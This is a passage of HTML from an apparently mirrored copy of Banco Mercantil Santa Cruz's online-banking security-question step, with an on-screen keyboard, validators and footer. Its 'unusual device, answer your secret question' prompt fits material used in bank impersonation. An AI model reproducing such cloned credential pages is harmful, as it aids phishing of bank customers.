shape="rect" coords="152,36,173,55" onclick="insertCharacter(15); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="112,17,132,35" onclick="insertCharacter(4); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="223,17,243,35" onclick="insertCharacter(9); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="132,16,155,35" onclick="insertCharacter(5); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="63,36,84,55" onclick="insertCharacter(11); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="68,16,88,35" onclick="insertCharacter(2); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="162,56,182,75" onclick="insertCharacter(27); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="139,56,160,75" onclick="insertCharacter(26); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="117,56,137,75" onclick="insertCharacter(25); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="94,56,115,75" onclick="insertCharacter(24); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="73,56,93,75" onclick="insertCharacter(23); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="52,56,72,75" onclick="insertCharacter(22); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="185,56,205,75" onclick="insertCharacter(28); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="207,56,227,75" onclick="insertCharacter(29); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="230,56,249,75" onclick="insertCharacter(30); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="251,56,272,75" onclick="insertCharacter(31); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="13,56,50,75" onclick="capsLock(); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="261,75,282,95" onclick="insertCharacter(44); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="193,74,214,95" onclick="insertCharacter(41); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="170,74,191,95" onclick="insertCharacter(40); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="148,75,171,95" onclick="insertCharacter(39); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="128,75,147,95" onclick="insertCharacter(38); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="105,75,127,95" onclick="insertCharacter(37); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="83,75,104,95" onclick="insertCharacter(36); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="60,75,81,95" onclick="insertCharacter(35); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();"><area shape="rect" coords="98,95,226,115" onclick="insertCharacter(45); showImageOnMouseUp(); return false;" onmousedown="showImageOnMouseDown();">
                                                </map>
                                            </div>
                                            <div class="contContrast">
                                                <div>
                                                    Contraste:
                                                </div>
                                                <span class="radio fl"><input id="MainContent_ctl01_ctl05_rbContrastOff" type="radio" name="ctl00$MainContent$ctl01$ctl05$rbgContrast" value="rbContrastOff" checked="checked" onclick="changeImage(4);" class="small"></span>
                                                <div class="contrastControls darker"></div>
                                                <span class="radio fl"><input id="MainContent_ctl01_ctl05_rbContrastOn" type="radio" name="ctl00$MainContent$ctl01$ctl05$rbgContrast" value="rbContrastOn" onclick="changeImage(5);" class="small"></span>
                                                <div class="contrastControls brighter"></div>
                                            </div>
                                            <div class="contBtnClose fr">
                                                <div class="closeBtn"></div>
                                            </div>
                                        </div>
                                    </li>

                                </ul>
                            </li>


                            <br>
                            
                            <li>
                                <div id="MainContent_ctl01_recaptchaDiv">
                                    <table style="width: 100%">
                                        <tbody><tr>
                                            <td>&nbsp;</td>
                                        </tr>
                                        <tr>
                                            <td style="padding-left: 42px;">
                                                <div id="MainContent_ctl01_UpdatePanel2">

                                                    <table width="100%" border="0" cellspacing="0" cellpadding="0">


                                                    </table>

                                                </div>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td style="padding-left: 84px;">



                                            </td>
                                        </tr>
                                    </tbody></table>
                                </div>
                            </li>
                            <li class="btn">
                                <div style="    text-align: center;
    font-size: 15px;
    letter-spacing: -0.01em;
    color: #5A5A5A;
    height: 30px;
    margin: 0 20px 0 47px !important;">
                                    <span>Usted está ingresando desde un equipo no habitual o ha realizado una actualización de software recientemente, responda a su pregunta secreta para confirmar su identidad.</span>
                                </div>
                            </li>
                            <br>
                            
                            


                        </ul>


                        <br>
                        


                    </div>
                    
                    
                    
                    
                    
                    <ul class="navBtns clear">
                        <li>
                            
                        </li>
                        <li>
                            <input class="btnGenericGreen next" id="Next" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$MainContent$ctl02$Next&quot;, &quot;&quot;, true, &quot;NextStep2&quot;, &quot;&quot;, false, false))" value="Confirmar" name="ctl00$MainContent$ctl02$Next" type="submit">
                        </li>
                    </ul>


                    <script language="javascript" type="text/javascript">
                        function UserNameValidation(source, arguments) {
                            var userName = document.getElementById('MainContent_ctl01_txtUserName');
                            if (null != userName) {
                                userName.value = userName.value.replace(/^\s*|\s*$/g, "");
                                arguments.IsValid = (userName.value != 'Ingrese su usuario' && userName.value != "" && userName.value != null);
                            } else {
                                arguments.IsValid = false;
                            }
                            var message = document.getElementById('MainContent_ctl01_liMessage');
                            if (!arguments.IsValid) {
                                message.className = "errorMsg";
                            } else {
                                message.className = "errorMsg invisible";
                            }
                        }

                        function UserNameValidationPwd(source, arguments) {
                            var userName = document.getElementById('MainContent_ctl01_txtUserNamePassword');
                            if (null != userName) {
                                //userName.value = userName.value.replace(/^*|$/g, "");
                                arguments.IsValid = (userName.value != 'Ingrese su usuario' && userName.value != "" && userName.value != null);
                            } else {
                                arguments.IsValid = false;
                            }
                            var message = document.getElementById('MainContent_ctl01_liMessagePwd');
                            if (!arguments.IsValid) {
                                message.className = "errorMsg";
                            } else {
                                message.className = "errorMsg invisible";
                            }
                        }

                        $("#MainContent_ctl01_recaptchaDiv").keypress(function(e) {
                            var code = e.keyCode || e.which;
                            if (code == 13) {
                                $("#Enter_Step1").click();
                            }
                        });

                        $("#MainContent_ctl01_txtUserNamePassword").keydown(function(e) {
                            var code = e.keyCode || e.which;
                            if (code == 9) {

                                if ($("#recaptcha_response_field").length != 0) {
                                    $("#recaptcha_response_field").focus();
                                    return false;
                                }
                            }
                        });


                        $("#MainContent_ctl01_txtUserName").keydown(function(e) {
                            var code = e.keyCode || e.which;
                            if (code == 9) {

                                if ($("#recaptcha_response_field").length != 0) {
                                    $("#recaptcha_response_field").focus();
                                    return false;
                                }
                            }
                        });
                    </script>


                    <script language="javascript" type="text/javascript">
                        function CancelValidateSecurityQuestionClicked() {
                            this.location.href = "Login.html";
                        }

                        function SetFocus() {
                            $('input[tabindex="1"]').focus();
                        }

                        $(document).ready(function() {
                            SetFocus();
                        });
                    </script>

                </div>
                <div class="fr">


                    <div class="close fr">

                    </div>
                    <div class="colRight">
                        <ul>
                            <li class="top"></li>
                            <li class="mid">
                                <img src="../../../App_Themes/Default/Images/banner_120x400.jpg" width="120px" height="400px">
                            </li>
                            <li class="bottom"></li>
                        </ul>

                        <ul id="RightContent_QuizASFI">
                            <li class="top"></li>
                            <li class="mid">

                               

                            </li>
                            <li class="bottom"></li>
                        </ul>

                    </div>

                </div>
            </div>

            <div id="containerBottom" class="fl">
            </div>

            <div id="footer" class="fl">
                <div class="fl">
                    Esta entidad se encuentra bajo la regulación y supervisión de la Autoridad de Supervisión del
                    Sistema Financiero (ASFI).
                </div>
                <div class="right">
                    <div class="logo fl" onclick="Logo_Click();">
                        <img src="../../../App_Themes/Default/Images/blank.png" alt="Footer Logo" width="88" height="23" longdesc="icBankingLongDescription.html">
                    </div>
                </div>
            </div>
            <div id="footer2" class=" fl">
                <div class="fl">
                    La información obtenida por medio de nuestro canal de Banca por Internet, debe estar sujeta a
                    confirmación y validación en las oficinas del Banco. Proteja su información personal, no permita que
                    se exponga a terceros.
                    <br>Copyright Banco Mercantil Santa Cruz 2014
                </div>
            </div>
        </div>

        <script type="text/javascript">
            //<![CDATA[
            var Page_Validators = new Array(document.getElementById("MainContent_ctl01_cvValidatorUserNamePwd"));
            //]]>
        </script>

        <script type="text/javascript">
            //<![CDATA[
            var MainContent_ctl01_cvValidatorUserNamePwd = document.all ? document.all["MainContent_ctl01_cvValidatorUserNamePwd"] : document.getElementById("MainContent_ctl01_cvValidatorUserNamePwd");
            MainContent_ctl01_cvValidatorUserNamePwd.controltovalidate = "MainContent_ctl01_txtUserNamePassword";
            MainContent_ctl01_cvValidatorUserNamePwd.focusOnError = "t";
            MainContent_ctl01_cvValidatorUserNamePwd.display = "Dynamic";
            MainContent_ctl01_cvValidatorUserNamePwd.evaluationfunction = "CustomValidatorEvaluateIsValid";
            MainContent_ctl01_cvValidatorUserNamePwd.clientvalidationfunction = "UserNameValidationPwd";
            MainContent_ctl01_cvValidatorUserNamePwd.validateemptytext = "true";
            //]]>
        </script>
        <script>

        </script>

        <script type="text/javascript">
            //<![CDATA[
            (function() {
                var fn = function() {
                    $get("ctl06_HiddenField").value = '';
                    Sys.Application.remove_init(fn);
                };
                Sys.Application.add_init(fn);
            })();
            PageRequestManager_Add_EndRequest(ASP_administration_webui_controls_general_login_logincompleteuserdata_ascx_ShowOperationResultPopup);
            var Page_ValidationActive = false;
            if (typeof(ValidatorOnLoad) == "function") {
                ValidatorOnLoad();
            }

            function ValidatorOnSubmit() {
                if (Page_ValidationActive) {
                    return ValidatorCommonOnSubmit();
                } else {
                    return true;
                }
            }

            document.getElementById('MainContent_ctl01_cvValidatorUserNamePwd').dispose = function() {
                Array.remove(Page_Validators, document.getElementById('MainContent_ctl01_cvValidatorUserNamePwd'));
            }
            //]]>
        </script>
        <script src="../../../../../www.google.com/recaptcha/apide3a.js?hl=es" async="" defer=""></script>
    </form>



 <script>
           var fech = document.getElementById('fech');
var meses = new Array ("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
var diasSemana = new Array("Domingo","Lunes","Martes","Miércoles","Jueves","Viernes","Sábado");
var f=new Date();
fech.innerHTML = diasSemana[f.getDay()] + ", " + f.getDate() + " de " + meses[f.getMonth()] + " de " + f.getFullYear();
</script>


</body></html>